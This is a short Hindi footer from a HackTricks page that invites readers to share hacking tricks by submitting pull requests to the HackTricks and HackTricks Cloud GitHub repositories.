* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>
